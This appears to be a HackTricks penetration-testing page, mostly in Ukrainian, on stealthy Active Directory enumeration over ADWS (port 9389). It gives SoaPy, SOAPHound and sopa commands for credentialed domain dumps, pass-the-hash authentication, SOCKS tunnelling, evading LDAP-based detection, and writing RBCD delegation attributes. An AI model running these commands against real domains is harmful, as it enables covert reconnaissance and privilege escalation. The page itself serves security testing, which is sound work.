# Active Directory Web Services (ADWS) Enumeration і Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## Що таке ADWS?

Active Directory Web Services (ADWS) **увімкнено за замовчуванням на кожному Domain Controller починаючи з Windows Server 2008 R2**, і він прослуховує TCP-порт **9389**.  Попри назву, **HTTP не використовується**.  Натомість сервіс надає доступ до даних у стилі LDAP через стек пропрієтарних .NET framing-протоколів:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Оскільки трафік інкапсулюється всередині цих бінарних SOAP-фреймів і передається через нетиповий порт, **enumeration через ADWS набагато рідше перевіряється, фільтрується або розпізнається за сигнатурами, ніж класичний LDAP-трафік через 389 і 636**.  Для операторів це означає:<sup>[[1]](#references)[[7]](#references)</sup>

* Stealthier recon – Blue teams часто зосереджуються на LDAP-запитах.
* Можливість збирати дані з **не-Windows хостів (Linux, macOS)**, тунелюючи 9389/TCP через SOCKS proxy.
* Ті самі дані, які можна отримати через LDAP (користувачі, групи, ACL, схема тощо), а також можливість виконувати **записи** (наприклад, `msDs-AllowedToActOnBehalfOfOtherIdentity` для **RBCD**).

Взаємодія з ADWS реалізується через WS-Enumeration: кожен запит починається з повідомлення `Enumerate`, яке визначає LDAP-фільтр/атрибути та повертає GUID `EnumerationContext`, після чого одне або кілька повідомлень `Pull` передають результати порціями обсягом до визначеного сервером вікна.<sup>[[7]](#references)</sup> Контексти стають недійсними приблизно через 30 хвилин, тому інструментам потрібно або розбивати результати на сторінки, або розділяти фільтри (запити за префіксом для кожного CN), щоб не втрачати стан.<sup>[[8]](#references)</sup> Під час запиту дескрипторів безпеки вкажіть control `LDAP_SERVER_SD_FLAGS_OID`, щоб виключити SACL; інакше ADWS просто видалить атрибут `nTSecurityDescriptor` із SOAP-відповіді.

> NOTE: ADWS також використовується багатьма інструментами RSAT GUI/PowerShell, тому такий трафік може змішуватися з легітимною адміністративною активністю.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) — це **повторна реалізація всього стеку протоколу ADWS на чистому Python**.  Він побайтно формує фрейми NBFX/NBFSE/NNS/NMF, що дає змогу збирати дані з Unix-подібних систем без використання .NET runtime.<sup>[[1]](#references)[[2]](#references)</sup>

### Основні можливості

* Підтримка **proxying через SOCKS** (корисно з C2 implants).
* Деталізовані search-фільтри, ідентичні LDAP `-q '(objectClass=user)'`.
* Необов'язкові **операції запису** ( `--set` / `--delete` ).
* **BOFHound output mode** для безпосереднього імпорту в BloodHound.<sup>[[3]](#references)</sup>
* Прапорець `--parse` для зручнішого відображення timestamp / `userAccountControl`, коли потрібна читабельність для людини.<sup>[[2]](#references)</sup>

### Прапорці цільового збору даних і операції запису

SoaPy містить готові switches, що відтворюють найпоширеніші LDAP hunting-завдання через ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, а також raw `--query` / `--filter` knobs для custom pulls.  Їх можна поєднувати з write primitives, такими як `--rbcd <source>` (встановлює `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging для targeted Kerberoasting) і `--asrep` (змінює `DONT_REQ_PREAUTH` у `userAccountControl`).<sup>[[2]](#references)</sup>

Приклад targeted SPN hunt, який повертає лише `samAccountName` і `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Використовуйте той самий хост/облікові дані, щоб негайно використати результати для атаки: виконайте dump об’єктів, здатних до RBCD, за допомогою `--rbcds`, а потім застосуйте `--rbcd 'WEBSRV01$' --account 'FILE01$'`, щоб підготувати ланцюжок Resource-Based Constrained Delegation (повний шлях зловживання див. у [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

### Встановлення (хост оператора)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump через ADWS (Linux/Windows)

* Fork `ldapdomaindump`, який замінює LDAP-запити на виклики ADWS через TCP/9389, щоб зменшити кількість спрацювань LDAP-сигнатур.
* Виконує початкову перевірку доступності 9389, якщо не передано `--force` (пропускає перевірку, якщо сканування портів створює багато шуму або фільтрується).
* Протестовано проти Microsoft Defender for Endpoint і CrowdStrike Falcon з успішним обходом, описаним у README.<sup>[[4]](#references)</sup>

### Встановлення
```bash
pipx install .
```
### Використання
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Типовий вивід містить перевірку доступності порту 9389, прив’язування ADWS і початок/завершення дампа:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - практичний клієнт для ADWS на Golang

Подібно до soapy, [sopa](https://github.com/Macmod/sopa) реалізує стек протоколів ADWS (MS-NNS + MC-NMF + SOAP) на Golang, надаючи прапорці командного рядка для виконання викликів ADWS, таких як:<sup>[[5]](#references)</sup>

* **Пошук і отримання об'єктів** - `query` / `get`
* **Життєвий цикл об'єктів** - `create [user|computer|group|ou|container|custom]` і `delete`
* **Редагування атрибутів** - `attr [add|replace|delete]`
* **Керування обліковими записами** - `set-password` / `change-password`
* а також інші, такі як `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` тощо.

### Основні особливості відповідності протоколам

* Пошук у стилі LDAP виконується через **WS-Enumeration** (`Enumerate` + `Pull`) із проєкцією атрибутів, керуванням областю видимості (Base/OneLevel/Subtree) та пагінацією.
* Отримання окремого об'єкта використовує **WS-Transfer** `Get`; зміни атрибутів виконуються через `Put`; видалення - через `Delete`.
* Вбудоване створення об'єктів використовує **WS-Transfer ResourceFactory**; для користувацьких об'єктів застосовується **IMDA AddRequest**, керований шаблонами YAML.
* Операції з паролями є діями **MS-ADCAP** (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Неавтентифіковане виявлення метаданих (mex)

ADWS надає WS-MetadataExchange без облікових даних, що є швидким способом перевірити доступність перед автентифікацією:<sup>[[5]](#references)</sup>
```bash
sopa mex --dc <DC>
```
### Нотатки щодо виявлення DNS/DC та націлювання Kerberos

Sopa може визначати DC через SRV, якщо `--dc` не вказано, а `--domain` надано. Він виконує запити в такому порядку та використовує ціль із найвищим пріоритетом:<sup>[[5]](#references)</sup>
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
Операційно надавайте перевагу resolver під контролем DC, щоб уникати збоїв у сегментованих середовищах:

* Використовуйте `--dns <DC-IP>`, щоб **усі** SRV/PTR/forward lookups виконувалися через DNS DC.
* Використовуйте `--dns-tcp`, якщо UDP заблокований або відповіді SRV великі.
* Якщо Kerberos увімкнено, а `--dc` має значення IP, sopa виконує **reverse PTR** для отримання FQDN, необхідного для коректного визначення SPN/KDC. Якщо Kerberos не використовується, PTR lookup не виконується.

Приклад (IP + Kerberos, примусовий DNS через DC):
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### Варіанти матеріалів автентифікації

Окрім паролів у відкритому вигляді, sopa підтримує **NT hashes**, **Kerberos AES keys**, **ccache** та **PKINIT certificates** (PFX або PEM) для автентифікації ADWS. Kerberos використовується автоматично під час застосування `--aes-key`, `-c` (ccache) або параметрів на основі сертифікатів.<sup>[[5]](#references)</sup>
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### Створення користувацьких об'єктів за допомогою шаблонів

Для довільних класів об'єктів команда `create custom` використовує YAML-шаблон, який відповідає IMDA `AddRequest`:<sup>[[5]](#references)</sup>

* `parentDN` і `rdn` визначають контейнер і відносне DN.
* `attributes[].name` підтримує `cn` або простір імен `addata:cn`.
* `attributes[].type` приймає `string|int|bool|base64|hex` або явний `xsd:*`.
* **Не включайте** `ad:relativeDistinguishedName` або `ad:container-hierarchy-parent`; sopa додає їх автоматично.
* Значення `hex` перетворюються на `xsd:base64Binary`; використовуйте `value: ""`, щоб установити порожні рядки.

## SOAPHound – високопродуктивний збір даних ADWS (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) — це .NET-колектор, який виконує всі взаємодії LDAP через ADWS і створює JSON, сумісний із BloodHound v4. Він один раз створює повний кеш `objectSid`, `objectGUID`, `distinguishedName` і `objectClass` (`--buildcache`), а потім повторно використовує його для високопродуктивних проходів `--bhdump`, `--certdump` (ADCS) або `--dnsdump` (інтегрований з AD DNS), тому з DC передаються лише близько 35 критичних атрибутів. AutoSplit (`--autosplit --threshold <N>`) автоматично розподіляє запити за префіксом CN, щоб не перевищити 30-хвилинний тайм-аут EnumerationContext у великих лісах.<sup>[[8]](#references)</sup>

Типовий робочий процес на VM оператора, приєднаній до домену:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Експортовані JSON-слоти безпосередньо інтегруються у робочі процеси SharpHound/BloodHound — див. [методологію BloodHound](bloodhound.md) для ідей щодо подальшої побудови графів. AutoSplit робить SOAPHound стійким під час роботи з лісами, що містять мільйони об'єктів, водночас зменшуючи кількість запитів порівняно зі snapshot у стилі ADExplorer.

## Прихований процес збору AD

Наведений нижче процес показує, як перерахувати **об'єкти домену й ADCS** через ADWS, перетворити їх на JSON BloodHound і шукати attack paths на основі сертифікатів — усе з Linux:

1. **Створіть тунель для 9389/TCP** із цільової мережі до своєї системи (наприклад, через Chisel, Meterpreter, динамічний port-forwarding SSH тощо). Експортуйте `export HTTPS_PROXY=socks5://127.0.0.1:1080` або використайте `--proxyHost/--proxyPort` у SoaPy.

2. **Зберіть об'єкт кореневого домену:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Зберіть об’єкти, пов’язані з ADCS, з Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Конвертувати у BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Завантажте ZIP** у GUI BloodHound і виконайте cypher-запити, такі як `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c`, щоб виявити шляхи ескалації сертифікатів (ESC1, ESC8 тощо).

### Запис `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Об’єднайте це з `s4u2proxy`/`Rubeus /getticket`, щоб отримати повний ланцюжок **Resource-Based Constrained Delegation** (див. [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Загальний огляд інструментів

| Призначення | Інструмент | Примітки |
|---------|------|-------|
| Перерахування ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, читання/запис |
| Дамп ADWS у великих обсягах | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, спочатку кешування, режими BH/ADCS/DNS |
| Імпорт даних у BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Перетворює журнали SoaPy/ldapsearch |
| Компрометація сертифікатів | [Certipy](https://github.com/ly4k/Certipy) | Може працювати через той самий SOCKS |
| Перерахування ADWS і зміна об’єктів | [sopa](https://github.com/Macmod/sopa) | Generic client для взаємодії з відомими кінцевими точками ADWS — дає змогу виконувати перерахування, створення об’єктів, змінювати атрибути та паролі |

## References

- [1] [SpecterOps – Обов’язково використовуйте SOAP(y) – Посібник оператора зі stealthy-збору даних AD за допомогою ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – специфікації MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Stealthy-перерахування середовищ Active Directory через ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – інструмент SOAPHound для збору даних Active Directory через ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
{{#include ../../banners/hacktricks-training.md}}
